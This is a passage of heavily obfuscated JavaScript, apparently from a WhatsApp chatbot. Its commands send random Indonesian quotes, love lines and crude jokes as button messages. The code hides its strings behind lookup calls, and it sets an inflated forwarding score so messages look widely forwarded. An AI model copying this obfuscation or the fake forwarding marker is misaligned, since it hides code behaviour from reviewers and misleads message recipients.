a1(0x719,0x8fd,0x74c,0x461)+_0x406083(0xa3e,0xdc4,0xc51,0xbbc),'Meskipun,\x20'+_0x406083(0x951,0xdf3,0xa3f,0x829)+'emburu\x20itu'+_0x406083(0xd0a,0xb72,0x9d2,0xf75)+_0x406083(0xbce,0xb7a,0xb08,0x9d3)+_0x4aaba1(0xa69,0xbc3,0x896,0xcc0)+'n,\x20aku\x20tid'+_0x4aaba1(0x952,0x710,0xda6,0xa9c)+'erjebak\x20ol'+'eh\x20itu\x20kar'+_0x4aaba1(0xbcf,0x813,0xa57,0xd91)+_0x406083(0xcda,0x90f,0x7e4,0xc71)+_0x4aaba1(0x581,0x311,0x317,0x93e)+'mburu.',_0x406083(0xce7,0x7d1,0x91d,0xf91)+_0x4aaba1(0x469,0x681,0x293,0x131)+_0x4aaba1(0x862,0x629,0xcbd,0xd67)+_0x4aaba1(0xb51,0x6f2,0xc97,0xf51)+'adi\x20udah\x20p'+_0x4aaba1(0x63b,0x398,0xa56,0xa11)+_0x4aaba1(0x974,0x9d0,0xbb3,0xbf8)+_0x406083(0x450,0x5d,0x545,0x85e)+_0x406083(0x696,0xa4a,0xa8a,0x9f7)+_0x4aaba1(0xa41,0xdd7,0xf21,0xcbd)+'ndai.','Jangan\x20rin'+_0x406083(0xc20,0x754,0xe6e,0xd91)+_0x406083(0x8df,0xb06,0xc54,0xa52)+_0x406083(0x39a,0x2d9,0x876,-0x5a)+_0x4aaba1(0x692,0x76f,0x994,0x8cf)+_0x4aaba1(0xb86,0xaf4,0xa87,0x888),_0x4aaba1(0x865,0xc42,0x548,0x57c)+_0x4aaba1(0x40f,0x11,-0x84,0x61)+'tu\x20hak\x20kam'+_0x406083(0x6fb,0x59b,0x729,0x51f)+'ngan\x20aku\x20y'+_0x406083(0xb41,0xcd6,0xb1d,0x75c)+'\x20ke\x20kamu.',_0x4aaba1(0x4e7,0x38b,0x3e4,0x3cb)+_0x4aaba1(0xbf0,0x10ea,0x7a4,0xdb1)+_0x406083(0xb4a,0xfa6,0xa44,0x6c3)+_0x406083(0x6e8,0x253,0x857,0x8ac)+_0x406083(0xc51,0x981,0xf35,0xe1e)+_0x406083(0xc25,0x74c,0x1046,0x1069)+_0x4aaba1(0xc5b,0xaf6,0xe92,0xae7)+_0x4aaba1(0x45c,0x609,0xa3,0x4d1)+'akan\x20menja'+_0x406083(0x7eb,0x99d,0x88a,0x9a9),_0x4aaba1(0xaa0,0xdfc,0xbb9,0x866)+_0x406083(0xbac,0x826,0x743,0xfc4)+_0x4aaba1(0x4cf,0x328,0x667,0x8b7)+_0x406083(0x5f0,0x509,0x40f,0x93b)+_0x406083(0x7dd,0x9e9,0x607,0x388)+_0x406083(0x778,0xb16,0x6c2,0xbe6)+_0x4aaba1(0x520,0x424,0x2f2,0x7de)+'a.',_0x4aaba1(0x918,0xe30,0xc5e,0x599)+_0x4aaba1(0xa0b,0xd64,0xbfa,0xe9d)+_0x406083(0x74a,0x365,0x2d6,0xbf4)+_0x4aaba1(0x7ab,0x959,0x38b,0x304)+_0x4aaba1(0x593,0x5b4,0x8e7,0x1ca)+_0x4aaba1(0xb61,0xcc5,0xa2b,0x71b)+_0x406083(0x391,0x31e,0x4a0,0x26c)+_0x406083(0x9d3,0x6fd,0x94e,0xb52)+_0x4aaba1(0xcc2,0x1152,0x8fe,0xd07)+_0x406083(0x542,0x51b,0x238,0xa54)+'logi.',_0x406083(0x830,0xa94,0xcdc,0x756)+_0x406083(0xab0,0xae8,0xc45,0x59c)+_0x406083(0x899,0x597,0x7eb,0x50a)+_0x4aaba1(0xca0,0xa6a,0x8df,0x809)+_0x4aaba1(0x7f3,0x45d,0x671,0x787)+_0x406083(0x727,0x9fa,0x74e,0x870)+_0x4aaba1(0xae5,0xd1f,0x8df,0xe3a)+'\x20kamu.\x20Aku'+_0x406083(0x72f,0xaf0,0x391,0xa04)+'u\x20kecewa.',_0x406083(0x71c,0x629,0x7e1,0x215)+_0x406083(0x788,0x85f,0x2c8,0x6e4)+_0x4aaba1(0x6b5,0x656,0x373,0x87a)+_0x406083(0x9cd,0xa84,0x691,0x811)+_0x4aaba1(0x5a5,0x558,0xab3,0x7dd)+'lin\x20aku,\x20a'+_0x406083(0xca1,0xb9b,0xee7,0xb89)+'a\x20apa-apa.'+_0x406083(0x4b3,0x938,0x20c,0x723)+_0x406083(0xd76,0xca3,0x8b3,0xfe2)+_0x406083(0x60f,0x159,0x4a9,0x3ff),'Dik\x20jangan'+_0x4aaba1(0xcdf,0xe07,0x105f,0xd20)+'h-jauh\x20kan'+_0x406083(0xb3f,0xc62,0xab7,0xf53)+'ku\x20di\x20tubu'+_0x406083(0x847,0x751,0x7bb,0xcc3),_0x4aaba1(0xc21,0xdb4,0x997,0xdde)+'ku\x20mungkin'+_0x406083(0x3ef,0x4a3,-0x89,0x8a0)+'\x20yang\x20dulu'+_0x406083(0x7d4,0x2cc,0xb3a,0x319)+'mbawa\x20aku\x20'+_0x4aaba1(0x734,0x5d5,0x474,0x4cb)+_0x4aaba1(0x8d7,0x7c6,0xa4b,0x7e5)+_0x4aaba1(0xc52,0xb73,0xd0f,0xd5f)+_0x406083(0x86d,0xa7c,0xa55,0x41d)+'fat\x20menjal'+_0x406083(0xaf4,0xeb2,0xc0b,0xf24)+_0x406083(0xa50,0x8b9,0xac3,0xe96),_0x4aaba1(0x82d,0x322,0x42e,0x618)+_0x406083(0x6b7,0x5a7,0x2b6,0x236)+'bagian\x20ter'+'besar\x20dari'+'\x20hidupku.\x20'+_0x406083(0x660,0x292,0x5ad,0x661)+_0x4aaba1(0x9d3,0xaeb,0xb88,0x6a4)+_0x4aaba1(0xb79,0xe1a,0xc6d,0x808)+_0x4aaba1(0x42f,0x114,0x6bc,-0xbf)+_0x4aaba1(0x721,0x4ac,0x746,0x80d)+_0x406083(0x87d,0x97b,0x8e0,0x798)+_0x4aaba1(0xc44,0xa63,0xcb5,0xf17)+_0x4aaba1(0xaf6,0xa34,0xbbd,0xf80)+'hal\x20yang\x20a'+_0x4aaba1(0x85f,0xb9a,0xbfc,0x55f)+_0x4aaba1(0x90a,0xbdb,0x640,0x85b)+_0x4aaba1(0xcc0,0xa13,0xfa0,0x7c7)],si=cc[Math[_0x4aaba1(0x4c4,0x38a,0x28c,-0x61)](Math['random']()*cc[_0x406083(0x797,0x59b,0x40c,0xb06)])],_0x2014f8={};_0x2014f8[_0x406083(0x50e,0x115,0x7ed,0x41b)+'t']=_0x406083(0x7d0,0x9f9,0x5b6,0x790);const _0x106699={};_0x106699[_0x406083(0x758,0xbcb,0xb99,0xa39)]='owner',_0x106699[_0x4aaba1(0x6e9,0x2ad,0x6c8,0x22e)]=_0x2014f8,_0x106699['type']=0x1;const _0x6566e1={};_0x6566e1[_0x4aaba1(0x543,0x1a8,0x311,0x88e)+'t']='Next\x20➡️';const _0x2cbe5a={};_0x2cbe5a[_0x406083(0x758,0xbd9,0x973,0x33d)]=''+command,_0x2cbe5a[_0x406083(0x6b4,0xb75,0x8f4,0x447)]=_0x6566e1,_0x2cbe5a['type']=0x1;var buttonns=[_0x106699,_0x2cbe5a];buttonMessage={'contentText':si,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+('Next\x20\x20for\x20'+_0x4aaba1(0x892,0xcd7,0x7f8,0xbf3)+'s\x20💞')+enter+_0x4aaba1(0x9d6,0x7d0,0x7c4,0xd00)+sender[_0x406083(0x676,0x8de,0x35d,0x84e)]('@')[0x3e*0x69+-0xdf5+-0xb79],'buttons':buttonns,'headerType':0x1};const _0x2af0ad={};_0x2af0ad[_0x4aaba1(0x533,0x223,0x788,0x98d)]='hi',_0x2af0ad[_0x406083(0x8cf,0x5e3,0x7d4,0xaff)+_0x406083(0x973,0x601,0x776,0x6f5)]=0x3b9aca00,_0x2af0ad[_0x406083(0x823,0x9b7,0x422,0xbb6)+'d']=!![],_0x2af0ad[_0x4aaba1(0x471,0x76e,0x5eb,-0xa6)+_0x406083(0x40c,0x68a,0xf8,0x826)]=!![],_0x2af0ad[_0x406083(0x858,0xa32,0x337,0x6a4)+'id']=[sender];const _0x1d7cdf={};_0x1d7cdf[_0x406083(0x478,0x681,0x53a,0x564)]=_0x406083(0xbd0,0xc90,0x93f,0xc9e)+'21',_0x1d7cdf['contextInf'+'o']=_0x2af0ad,_0x1d7cdf[_0x406083(0xcae,0xbb1,0x1046,0xe9d)]=ftoko,_0x1d7cdf['sendEpheme'+_0x406083(0x40c,0x8dd,-0x10d,0x8a1)]=!![],alpha[_0x406083(0x87f,0x8be,0xd2d,0x525)+'e'](from,buttonMessage,MessageType[_0x4aaba1(0xa29,0x8e7,0x74e,0xd81)+'sage'],_0x1d7cdf);break;case _0x4aaba1(0xd89,0x11c3,0xaf9,0xa30)+_0x4aaba1(0xa97,0x81f,0x884,0xf6f):const kata_lucu=[_0x4aaba1(0x6bd,0x1ad,0x494,0x58b)+_0x406083(0x519,0x22b,0x5f7,0x2b3)+_0x4aaba1(0xd7f,0xd30,0xe15,0x1015)+_0x406083(0x6d7,0x7c5,0x4fb,0x29e)+'menikah\x20me'+_0x406083(0x6ba,0x60e,0x3eb,0x598)+_0x4aaba1(0x857,0xc4c,0xc41,0xc36)+'ana\x20dan\x20bi'+'jak\x20sini.”',_0x4aaba1(0x4c9,0x7e0,0x93,0x979)+_0x406083(0x598,0x234,0x562,0x78b)+'suksesan\x20y'+_0x4aaba1(0x91d,0x7e2,0x82a,0x508)+_0x4aaba1(0xd02,0xb56,0xb37,0xade)+_0x4aaba1(0x844,0xd3d,0xc99,0xb29)+_0x4aaba1(0xd9c,0x981,0x9ca,0x119e)+_0x406083(0xc7d,0xbf4,0x914,0x832)+_0x406083(0x51d,0x9e8,0x868,0x7a0),_0x406083(0x5ec,0x9dc,0x2c8,0xa55)+_0x4aaba1(0xb84,0xa4c,0x89f,0xd12)+_0x4aaba1(0x614,0x1cc,0x543,0x931)+_0x4aaba1(0x8cc,0x93c,0xa26,0x882)+_0x4aaba1(0x9d5,0xa13,0xe21,0x9ac)+_0x406083(0xba6,0x86b,0xd6d,0x697),_0x4aaba1(0xa4a,0x9a9,0x97c,0xe1f)+'\x20pekerjaan'+_0x406083(0xa21,0xe78,0x6b0,0xd66)+_0x4aaba1(0xc32,0x7bc,0x1101,0x101a)+_0x4aaba1(0x3a4,-0x7e,0x1a9,0x3f4)+'rjaan\x20sebe'+'rat\x20apapun'+'\x20akan\x20tera'+_0x406083(0xb4d,0x869,0x726,0x8bf)+'kalau\x20tida'+_0x4aaba1(0x848,0x98d,0x980,0x635)+_0x4aaba1(0x73f,0x3a9,0x47e,0x5c7),'“Sayang…\x20t'+_0x4aaba1(0x63c,0x624,0x4e6,0x23c)+_0x406083(0xbba,0xa91,0xa6f,0xf83)+_0x406083(0x8dc,0xa8b,0x7ed,0xbb3)+'karena\x20mer'+_0x406083(0x9fa,0x5f6,0x671,0x7af)+_0x4aaba1(0x4f5,0x2b8,0x264,0x948)+_0x4aaba1(0x510,0x125,0x2da,0x6df)+_0x406083(0xb50,0x9e9,0xecd,0xab5)+'karena\x20mem'+_0x406083(0x62c,0x28b,0x642,0x2ee)+_0x4aaba1(0x9bf,0x6ec,0x99b,0x8c5)+_0x4aaba1(0x537,0x70b,0x93e,0xb6)+_0x406083(0x8d8,0x724,0x5f1,0xd3a)+_0x4aaba1(0xc75,0x8b0,0x996,0xba0)+'rena\x20kelap'+_0x4aaba1(0xbd9,0xe95,0x885,0x905),'“Manusia\x20i'+_0x4aaba1(0x997,0x963,0xdcb,0xcf7)+_0x4aaba1(0x5e2,0x10c,0x4cc,0x755)+_0x4aaba1(0xda1,0xe2b,0xc10,0xf85)+_0x4aaba1(0x68b,0x1c9,0xa83,0xb0b)+_0x406083(0x7ef,0x6ef,0x6a6,0x377)+_0x4aaba1(0x47b,0x830,0x547,0x70d)+_0x406083(0x406,-0x2,0x530,0x451)+'at\x20ini\x20mun'+'gkin\x20jodoh'+_0x406083(0x955,0xc6a,0x79c,0x4d5)+_0x4aaba1(0xc9e,0x8da,0xe74,0x840)+'aat\x20masih\x20'+_0x406083(0x65c,0x3bb,0x8cf,0x7cc),_0x406083(0x4d1,0x901,0x714,0x1dc)+'n\x20itu\x20bera'+_0x4aaba1(0xdd1,0xe2d,0xff4,0x11f0)+'ebuah\x20impi'+_0x406083(0x860,0xaa3,0x81e,0x9b9)+_0x406083(0xca4,0x10ea,0x81a,0x953)+_0x406083(0x6ae,0x896,0xb81,0x1ac)+_0x406083(0xa0d,0xc3d,0xacd,0x664)+_0x4aaba1(0xa00,0xa0e,0xad6,0x9cf)+_0x4aaba1(0x4b5,0x6ca,0x550,0x165)+_0x4aaba1(0x78a,0xad1,0xa6b,0x9be)+_0x406083(0x87c,0xabe,0xd34,0x495)+_0x4aaba1(0xb1b,0xe07,0x5fc,0x6c7)+_0x4aaba1(0x8cd,0x6f5,0x73d,0xb5d)+_0x406083(0xada,0x88f,0x881,0xa53)+_0x406083(0x56b,0x8b8,0x3be,0x7a9),_0x4aaba1(0xb4f,0x9d4,0x9db,0xc15)+'ng\x20cantik\x20'+_0x406083(0xc04,0x82a,0xd9d,0xad3)+_0x4aaba1(0xdbb,0x90b,0xeea,0xcc0)+_0x406083(0xbbd,0xd10,0xf18,0xc34)+_0x4aaba1(0x5af,0x4a2,0x3a8,0x3dc)+_0x4aaba1(0x9f0,0xe44,0x55b,0xefd)+_0x406083(0x60d,0x671,0x517,0xad5)+_0x406083(0x5e5,0xe2,0x236,0x6f4)+_0x406083(0x8d3,0x407,0xd62,0x568)+'nita\x20yang\x20'+_0x4aaba1(0xb6d,0x1033,0x9ee,0xecc),_0x406083(0xbe4,0x9b3,0x82b,0x794)+_0x406083(0xd75,0xfff,0x1161,0xe6b)+_0x4aaba1(0xc2e,0xde0,0xee0,0x9aa)+_0x406083(0x914,0xd51,0x5ee,0xbdd)+_0x4aaba1(0xbbb,0xf0e,0xaf1,0xf5e)+_0x406083(0x9e2,0xb49,0x4d2,0x527),_0x4aaba1(0x868,0xc72,0x57a,0xb75)+_0x4aaba1(0x539,0x1f8,0x9a6,0x5a5)+_0x406083(0xda2,0x126f,0xace,0xe51)+_0x406083(0xcfb,0xbae,0x81e,0xd29)+_0x4aaba1(0xcef,0xc1b,0xd90,0xc98)+_0x4aaba1(0x9b1,0xa0a,0x7e4,0xb17),_0x4aaba1(0x48c,0x32f,0x676,0x20b)+_0x4aaba1(0x815,0x498,0xa34,0x96b)+_0x4aaba1(0x57e,0x8ed,0x25a,0x383)+_0x4aaba1(0xb06,0xcf4,0xcb8,0x5e4)+_0x4aaba1(0xd19,0x107d,0xb6b,0xd12)+_0x4aaba1(0xbd1,0x72c,0xc61,0x87a),_0x4aaba1(0x392,0x1bd,0x283,0x4f9)+_0x4aaba1(0x939,0xae6,0x78c,0x412)+'mewujudkan'+'\x20impianmu\x20'+_0x406083(0xb0e,0x69c,0x846,0xe03)+'gun\x20dari\x20t'+_0x406083(0xb5f,0x819,0xcde,0x1066)+_0x4aaba1(0x722,0x9fd,0x620,0x799),_0x4aaba1(0xdba,0x123f,0x1261,0x10e5)+_0x4aaba1(0xcf9,0xf9b,0xf7a,0xade)+'\x20itu\x20kunin'+_0x4aaba1(0xae9,0xb6f,0x82b,0x806)+'itu\x20tai,\x20j'+'adi\x20diam-d'+_0x406083(0x560,0x82b,0x44b,0x937)+_0x406083(0x9e2,0x8ee,0x63d,0xdd6),_0x406083(0xa79,0xc71,0x702,0xf45)+_0x406083(0xc0d,0xcb0,0xb9c,0xb47)+'kesuksesan'+_0x406083(0x8f9,0xc09,0x4e0,0x50d)+_0x406083(0x51c,0x714,0x925,0x15c)+_0x406083(0x85b,0x786,0x8c4,0x828)+_0x406083(0xcc1,0xe2c,0xcee,0x115f)+_0x4aaba1(0x5a9,0xa1d,0x2ba,0x948)+_0x4aaba1(0x743,0xa25,0xa51,0xa98)+'\x20ketika\x20ka'+_0x4aaba1(0x6fa,0x99a,0x4b0,0x9b0)+'amu\x20akan\x20l'+_0x406083(0xd4c,0xe0a,0xb7c,0x1115)+_0x4aaba1(0xb5f,0xebd,0xd8b,0x1018)+_0x406083(0xc98,0xc4a,0x89a,0xa33)+_0x4aaba1(0x6e7,0x738,0x257,0x879)+_0x406083(0x3e1,0x7c0,0x4a9,0x768),_0x4aaba1(0x4a2,0x800,-0x40,0x756)+'salah\x20past'+'i\x20akan\x20ada'+_0x406083(0x5e4,0x8b1,0x329,0x1d7)+_0x4aaba1(0x4a7,0x7f4,0x24,0x927)+_0x4aaba1(0x6b6,0x2bb,0x3c1,0x5ea)+_0x406083(0x958,0xcc8,0xb66,0x49d)+'menemukann'+_0x406083(0x949,0xc41,0x6fe,0x79c)+_0x406083(0x66b,0x5c5,0x24a,0x6b0)+'ri\x20akar\x20te'+'rsebut\x20sam'+_0x4aaba1(0xad6,0xb60,0x9ff,0xecb),_0x4aaba1(0x660,0xaca,0x32e,0xb6c)+_0x4aaba1(0x7c6,0x2da,0x9a9,0xb36)+_0x4aaba1(0x794,0x2e1,0x2ad,0xbe9)+'up\x20untuk\x20m'+_0x406083(0x76b,0x90c,0x7fa,0x4e7)+_0x406083(0x810,0x937,0xa2c,0x54b)+_0x4aaba1(0x587,0xa25,0x7cd,0x1dd)+'g,\x20maka\x20bi'+_0x4aaba1(0xa84,0x947,0xd72,0xd0c)+_0x4aaba1(0x620,0x92b,0x29b,0x388)+_0x4aaba1(0xa46,0xafa,0xec5,0x82f)+_0x406083(0xa60,0xb4b,0xa52,0xf35),_0x4aaba1(0x717,0x90f,0x76b,0x5b5)+_0x4aaba1(0x756,0xb9a,0x314,0x6fc)+_0x4aaba1(0x60b,0x9a8,0x123,0x5fa)+_0x406083(0x844,0xb5c,0xb1d,0x8ef)+_0x4aaba1(0x633,0x1e7,0x213,0x77d)+_0x406083(0x71e,0xb31,0x943,0x861)+_0x4aaba1(0x5d8,0x2dd,0xa0e,0x4d9)+_0x406083(0xc95,0x117d,0x76f,0xe53)+_0x4aaba1(0x72b,0x234,0xa63,0x2d3)+'lah\x20seseor'+_0x4aaba1(0x9c9,0xc69,0x85f,0xb39)+_0x4aaba1(0xc68,0xb72,0x9e5,0xe0c)+_0x406083(0x54f,0x370,0x29a,0x673)+_0x406083(0x635,0x89c,0x442,0x86e),_0x406083(0x494,0x5d6,0x385,0x91c)+_0x4aaba1(0x5cd,0x909,0xae1,0x714)+_0x406083(0xcc8,0x11c0,0x1013,0x11ac)+_0x4aaba1(0xcb2,0xceb,0x1073,0xf6a)+'unda\x20maka\x20'+'kebohongan'+_0x406083(0x598,0x736,0x36c,0x21c)+_0x4aaba1(0x804,0x455,0x9f4,0x34d)+_0x4aaba1(0x987,0x93a,0xc70,0xb44)+'a.”',_0x406083(0xb5a,0xcae,0xb48,0x918)+'elak\x20tawa\x20'+_0x4aaba1(0x9d4,0xe88,0xee2,0xebc)+'sehat.\x20Gel'+_0x406083(0x78e,0x6ab,0x361,0x691)+_0x4aaba1(0xb1d,0x1024,0xc93,0xf96)+'e\x20bawah\x20da'+_0x4aaba1(0x97d,0x7bc,0x9ce,0xc32)+'i\x20celana\x20A'+_0x4aaba1(0x9b0,0x97d,0xddd,0x545)+_0x4aaba1(0x502,0x177,0x7ed,0x1ea),_0x406083(0x580,0xa49,0x983,0x79b)+_0x406083(0xc05,0xba9,0xd1e,0xbd0)+_0x406083(0x3b9,0x3b7,0x691,-0xae)+_0x406083(0xbab,0xa7d,0xdaa,0xf42)+_0x4aaba1(0xbc4,0x6e2,0xdea,0xde0)+_0x4aaba1(0x507,0x4ff,0x812,0x76e)+'kalo\x20tidur'+'\x20miring.”',_0x406083(0xb52,0x1029,0x888,0xfc5)+_0x4aaba1(0x656,0x302,0x3c6,0x497)+_0x4aaba1(0xdd9,0xb86,0x111f,0xe5d)+_0x406083(0x3e0,0x108,0xa1,0x5cc)+_0x4aaba1(0x62f,0x5d6,0x37d,0x9a3)+'nya\x20melind'+_0x4aaba1(0x9aa,0x62c,0x8f7,0x7ae)+_0x4aaba1(0xaa7,0x700,0x98e,0xcd7)+_0x4aaba1(0x3b5,0x5d3,0x3ab,-0x98)+_0x4aaba1(0xcdc,0xb28,0xe79,0xa57)+'indah.”',_0x406083(0x88d,0x4ee,0x473,0xaf1)+_0x406083(0xb81,0xbb9,0x928,0x73b)+'u\x20berenang'+'-renang\x20ke'+_0x4aaba1(0xae3,0x7b5,0xe75,0x883)+_0x4aaba1(0xb54,0xc78,0xcbf,0x8e2)+_0x4aaba1(0xba5,0xeaf,0xf7a,0x67f)+_0x406083(0x5d8,0x207,0x26d,0x8e5)+'eriang\x20kem'+_0x4aaba1(0xcce,0xdd1,0xab1,0xa12),_0x406083(0xd96,0x993,0xd5e,0xd8b)+_0x4aaba1(0x7d4,0x37b,0x489,0x572)+_0x406083(0x9e3,0x943,0x9ea,0xa3d)+_0x4aaba1(0xc96,0x8ab,0xcb6,0x906)+_0x406083(0x6c0,0x9ad,0x688,0x74b)+_0x4aaba1(0xca9,0x7f0,0xc57,0x8dc)+_0x4aaba1(0x999,0x55e,0x87d,0xb67)+'t,\x20bagaima'+'na\x20kalau\x20s'+'atu\x20kampun'+_0x406083(0x9d7,0x7c0,0x5e1,0xbf1),_0x4aaba1(0x9bd,0xa39,0x8cc,0xe52)+_0x4aaba1(0x5e4,0xa93,0x9de,0x66a)+_0x4aaba1(0x8d4,0x889,0x72e,0x663)+_0x4aaba1(0x5ed,0x2f5,0xa3b,0x988)+_0x406083(0xb22,0xbe4,0x996,0x103e)+_0x4aaba1(0xc0e,0xf41,0xc5e,0x721)+_0x406083(0x8a8,0x4fa,0xd85,0x764)+_0x406083(0x94a,0x7a9,0xb3b,0x7f0)+_0x406083(0xc94,0x1121,0x907,0xdac)+_0x4aaba1(0x4e1,0x290,0x441,0x6a8)+_0x4aaba1(0xc53,0xfa9,0x109a,0x86e)+_0x4aaba1(0xa90,0xecf,0x76c,0xe85),_0x406083(0x40b,0x633,0xcd,0x110)+_0x4aaba1(0xc97,0xf8c,0xbc4,0xe55)+'tik,.\x20Rusa'+'k\x20susu\x20seb'+'elanga…\x20Ga'+_0x4aaba1(0x856,0xc33,0x7f5,0x582)+_0x406083(0xd81,0xa34,0xd82,0x121b)+_0x4aaba1(0xd8d,0xb43,0xd26,0xa5b)+_0x406083(0x4e7,0x5dd,0x104,0x31c)+_0x406083(0x45d,0x912,0x192,0x47c),_0x406083(0x86b,0xd82,0xce3,0x4b6)+'anyak\x20bela'+'jar,\x20semak'+'in\x20banyak\x20'+_0x4aaba1(0x469,0x127,0x58f,0x902)+_0x4aaba1(0x86c,0xcb2,0x68e,0xd46)+'kin\x20banyak'+_0x406083(0xbc5,0xbe2,0xb0b,0xfd8)+'\x20tahu,\x20sem'+_0x406083(0x390,0x7ec,0x409,0x505)+_0x406083(0x902,0x703,0x7c9,0x4ff)+_0x406083(0xd60,0xde9,0xefb,0xc90)+_0x4aaba1(0x494,0x702,0x194,0x587)+_0x4aaba1(0x518,0x740,0x859,0x3ee)+_0x4aaba1(0xce1,0x1195,0xee6,0x9bd)+'emakin\x20sed'+_0x4aaba1(0x9de,0xe36,0x985,0x8e6)+'kita\x20tahu.'+_0x406083(0x6c6,0x27c,0x915,0x81d)+_0x4aaba1(0x932,0xb05,0xc3f,0x8df)+_0x406083(0xbe1,0x734,0xa96,0xb75)+_0x406083(0x3cb,0x29e,0x611,0x339),_0x406083(0x372,0x2d4,0x41e,0x3b0)+_0x406083(0xa10,0xcdd,0x65a,0x87e)+_0x4aaba1(0xbbe,0xffa,0x8bc,0x106d)+_0x406083(0x795,0xa23,0xb20,0x671)+'\x20janganlah'+_0x406083(0x52b,0x8eb,0x2ed,0x92c)+_0x4aaba1(0xa2e,0xad7,0xaf4,0x68a)+_0x4aaba1(0xcc6,0x103d,0x10e9,0x102a)+_0x4aaba1(0x443,0x28c,0x8a8,0x281)+_0x4aaba1(0x7bf,0x5f4,0x9b0,0x375)+'n\x20dan\x20lemp'+_0x406083(0xcf6,0x8e1,0x94d,0xb8f)+_0x4aaba1(0xd0e,0x1105,0xdcc,0xa28)+'\x20Tapi\x20usah'+_0x406083(0x7bd,0x9d0,0x553,0x449)+_0x4aaba1(0xc4f,0xd11,0x738,0xdd3)+'lempar.”','“Wanita\x20ca'+'ntik\x20bukan'+_0x4aaba1(0x4b4,0x5d7,0x438,0x240)+_0x4aaba1(0x635,0x488,0x4d8,0xb55)+_0x4aaba1(0xa80,0xb6a,0x707,0xeab)+_0x406083(0xbf4,0xb79,0xe6b,0xcdd)+_0x406083(0x856,0xa2d,0xaf0,0x5ac)+_0x4aaba1(0x739,0xb54,0x368,0x790)+_0x406083(0x68e,0xaa6,0x4b6,0x701),_0x406083(0x96d,0xad0,0x4ed,0x794)+'stri\x20yang\x20'+_0x406083(0xab8,0x775,0xbde,0x8e0)+_0x4aaba1(0x54a,0x98c,0x97d,0x280)+_0x406083(0xcc5,0xd71,0xd51,0xd96)+_0x406083(0x74b,0x9ee,0x529,0xa45)+_0x406083(0x3f3,0x58d,-0x9d,0x2a1)+_0x4aaba1(0x445,0x633,0x31,0x7e6)+_0x406083(0xd39,0x8c0,0xb1e,0xc22)+'ah)\x20&\x20jadi'+_0x4aaba1(0x83b,0x84c,0xb24,0xa8e)+'yang\x20SIAGA'+_0x4aaba1(0x8c0,0x4d2,0x7bf,0x8a5)+_0x406083(0x877,0x91c,0x608,0x629)+'aya\x20Apa\x20Sa'+_0x406083(0x8af,0x8fc,0xc35,0x6ff),'“Tidak\x20ada'+_0x4aaba1(0x461,0x7d1,0x965,0x28)+'\x20yang\x20bera'+_0x406083(0xa56,0xa1d,0x5c5,0xb16)+_0x406083(0x672,0x40d,0x547,0x9d3)+_0x406083(0xb64,0xb57,0x103c,0xcea)+_0x406083(0x661,0x37a,0xa0c,0x42e)+_0x406083(0x5f6,0x33a,0x853,0x957)+_0x4aaba1(0x731,0x298,0xbc4,0x852)+_0x4aaba1(0x4e3,0x3cf,0x929,0x405)+'mengerjaka'+_0x4aaba1(0x62a,0xa21,0xad4,0x97a)],kata_lucu_=kata_lucu[Math['floor'](Math[_0x4aaba1(0xadf,0x611,0xc27,0xe2e)]()*kata_lucu['length'])],_0xd8b3c0={};_0xd8b3c0[_0x406083(0x50e,0x46d,0x6cd,0x2d3)+'t']='☠️\x20Owner\x20';const _0x138b3b={};_0x138b3b[_0x406083(0x758,0x559,0x724,0x444)]=_0x4aaba1(0xd52,0xa27,0x8c2,0xc53),_0x138b3b['buttonText']=_0xd8b3c0,_0x138b3b['type']=0x1;const _0xef31f6={};_0xef31f6['displayTex'+'t']=_0x406083(0x4df,0x36e,0x6c3,0x8eb);const _0x415001={};_0x415001['buttonId']=''+command,_0x415001[_0x406083(0x6b4,0xb08,0x686,0xa08)]=_0xef31f6,_0x415001[_0x406083(0x7e1,0x53f,0x5e8,0x329)]=0x1;var buttonns=[_0x138b3b,_0x415001];buttonMessage={'contentText':kata_lucu_,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+(_0x4aaba1(0x9f7,0xb7b,0xe4c,0xe8f)+_0x4aaba1(0x892,0xc9c,0xba3,0x60d)+_0x406083(0x9cf,0x8aa,0xdc1,0x87f))+enter+_0x4aaba1(0x9d6,0xcbe,0x86c,0xe40)+sender['split']('@')[-0x1850+-0x1957+0x31a7],'buttons':buttonns,'headerType':0x1};const _0x5db3a9={};_0x5db3a9[_0x406083(0x4fe,0x84c,0xa15,0x70e)]='hi',_0x5db3a9[_0x4aaba1(0x904,0x8a9,0x660,0x546)+_0x406083(0x973,0xa31,0x939,0x460)]=0x3b9aca00,_0x5db3a9[_0x4aaba1(0x858,0xc62,0xade,0x6bf)+'d']=!![],_0x5db3a9['sendEpheme'+_0x4aaba1(0x441,0x815,0x356,0x7ae)]=!![],_0x5db3a9[_0x406083(0x858,0x710,0x51c,0x7d5)+'id']=[sender];const _0x51aac0={};_0x51aac0['caption']=_0x4aaba1(0xc05,0x926,0xc0c,0x834)+'21',_0x51aac0[_0x4aaba1(0x887,0x879,0x8c5,0x879)+'o']=_0x5db3a9,_0x51aac0[_0x4aaba1(0xce3,0x1155,0xe4c,0x95e)]=ftoko,_0x51aac0['sendEpheme'+_0x406083(0x40c,-0x29,0x33,0x513)]=!![],alpha[_0x4aaba1(0x8b4,0xcf4,0xd12,0xcbb)+'e'](from,buttonMessage,MessageType[_0x406083(0x9f4,0x579,0xe97,0x952)+_0x406083(0x4ca,0x9e5,0x69,0x8a5)],_0x51aac0);break;case _0x4aaba1(0xdc6,0xab3,0x8e9,0xfbd)+_0x4aaba1(0x71e,0x8d6,0xaa8,0x2b7):const longtong=[_0x406083(0xd8b,0xa88,0x101e,0xcd2)+_0x4aaba1(0x59b,0xf3,0x3d7,0x18b)+_0x4aaba1(0xccf,0xbaa,0xded,0xd04)+_0x406083(0x67a,0x33c,0x6dc,0x957)+_0x4aaba1(0x617,0x94a,0x855,0x68b)+_0x4aaba1(0xb92,0x109c,0x6d0,0xe79)+_0x4aaba1(0x8b3,0x8c1,0x94b,0x714)+_0x406083(0xa8f,0xa50,0xe42,0xb27)+_0x4aaba1(0x688,0x168,0x483,0x448),_0x406083(0x6f3,0x95e,0x568,0x2ad)+'paling\x20tep'+'at\x20dan\x20nik'+_0x4aaba1(0x663,0x8ae,0x160,0x42e)+_0x406083(0xda0,0x95e,0x124b,0x953)+'\x20adalah\x20se'+_0x4aaba1(0x74c,0x2b7,0x953,0xc6f)+'\x20itu\x20jadi\x20'+_0x406083(0x7cd,0xc7f,0x6b6,0x921),_0x406083(0x785,0x957,0x6e6,0xb2f)+_0x4aaba1(0xac7,0xbd0,0x6de,0xad4)+_0x406083(0x6dc,0xb8b,0x2e0,0x343)